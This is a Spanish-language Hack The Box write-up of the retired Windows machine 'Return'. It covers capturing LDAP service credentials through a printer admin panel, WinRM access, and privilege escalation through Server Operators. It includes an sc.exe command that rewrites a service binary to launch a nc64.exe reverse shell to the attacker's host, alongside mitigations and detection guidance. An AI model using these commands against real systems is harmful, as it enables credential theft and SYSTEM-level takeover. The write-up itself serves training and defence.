---
machine: Return
os: Windows
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
pwned: null
tags: [windows, active-directory, ldap, winrm, server-operators, service-abuse]
---

# Return — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (27/09/2021). Ficha de referencia; no jugada en este perfil.
> Sin flags ni credenciales reales.

## TL;DR

El panel de administración de una impresora permite configurar el servidor LDAP. Al lanzar la prueba de conexión, la aplicación envía un *bind* contra la IP del atacante y expone las credenciales del servicio. Esas credenciales funcionan en WinRM; la cuenta pertenece a **Server Operators**, que puede reconfigurar el binario de un servicio y ejecutarlo como SYSTEM.

## Reconocimiento

```bash
nmap -Pn -p- --min-rate 2000 <TARGET_IP>
nmap -Pn -sCV -p 22,53,80,88,135,139,389,445,593,3268,3389,5985 <TARGET_IP>
```

| Puerto | Servicio | Observación |
|---|---|---|
| 80/tcp | HTTP | Panel PHP de impresora |
| 88/tcp | Kerberos | DC `return.local` |
| 389/tcp | LDAP | Directorio |
| 445/tcp | SMB | Firma obligatoria |
| 5985/tcp | WinRM | Acceso remoto |

```bash
echo "<TARGET_IP> return.local printer.return.local" | sudo tee -a /etc/hosts
```

## Enumeración

- `http://return.local/` muestra un panel de administración de impresora.
- `settings.php` permite cambiar el servidor LDAP, el usuario y la contraseña.
- `feroxbuster` confirma `settings.php` y el resto de la aplicación.
- `smbclient -L` no permite listar recursos sin autenticación, pero confirma el dominio `return.local`.

## Foothold

### 1. Capturar el bind LDAP

Se pone un listener en el puerto 389 y se configura el panel para que apunte a la IP del atacante:

```bash
sudo nc -lvnp 389
```

En `settings.php` se introduce `<LHOST>` como servidor LDAP y se pulsa **Test**. La aplicación envía un `bindRequest` con el usuario y la contraseña del servicio. En el listener se leen en claro.

### 2. Validar las credenciales

```bash
nxc smb <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>' -d return.local
nxc winrm <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>' -d return.local
```

WinRM devuelve `Pwn3d!`: la cuenta puede abrir una sesión remota.

```bash
evil-winrm -i <TARGET_IP> -u 'svc-printer' -p '<PASSWORD>'
```

## Movimiento lateral

- No hay pivote: el panel web y el DC son el mismo host.
- La cuenta de servicio se reutiliza en WinRM y en SMB.
- `whoami /groups` confirma la pertenencia a **Server Operators**, grupo que puede iniciar y detener servicios en el DC.

## Escalada de privilegios

`Server Operators` permite modificar la configuración de un servicio. Se cambia el binario de un servicio que ya existe para que ejecute una reverse shell y se arranca:

```cmd
sc.exe qc VSS
sc.exe config VSS binPath= "C:\Windows\System32\cmd.exe /c C:\ProgramData\nc64.exe -e cmd <LHOST> <LPORT>"
sc.exe start VSS
```

El servicio puede devolver el error 1053; la shell suele llegar igualmente porque `cmd.exe` ya lanzó el proceso hijo. En el listener se obtiene `nt authority\system`.

## Evidencia

- `settings.php` con el campo de servidor LDAP controlable.
- `nc` mostrando el `bindRequest` con usuario y contraseña.
- `nxc winrm` con `Pwn3d!`.
- `whoami /groups` con `Server Operators`.
- `sc qc` antes y después del cambio de `binPath`.

## Lecciones aprendidas

- Un panel de administración que permite configurar un servidor LDAP es una fuente de credenciales si acepta un host arbitrario.
- Las cuentas de servicio suelen reutilizar contraseña entre LDAP, SMB y WinRM.
- `Server Operators` es un grupo administrativo de facto en un DC: no hace falta ser Domain Admin para ejecutar código como SYSTEM.
- Reconfigurar un servicio es menos ruidoso que crear uno nuevo, pero deja eventos 7045/4697 y cambios en el registro.

## Mitigaciones y detección

- No permitir que paneles de impresora o aplicaciones web elijan libremente el servidor LDAP; usar un allowlist y credenciales de solo lectura.
- Rotar la contraseña de `svc-printer` y limitar su logon a los equipos necesarios.
- Restringir `Server Operators` a cuentas humanas y auditar sus cambios.
- Detección: **4624** tipo 3/10 desde el host web, **4672** con privilegios de servicio, **7045** y **4697** por cambios de servicio, y conexiones salientes al puerto 389 desde el DC.

MITRE: T1557, T1078.002, T1543.003, T1021.001.

## Referencias

- <https://0xdf.gitlab.io/2022/05/05/htb-return.html>
- <https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups>
- <https://attack.mitre.org/techniques/T1543/003/>
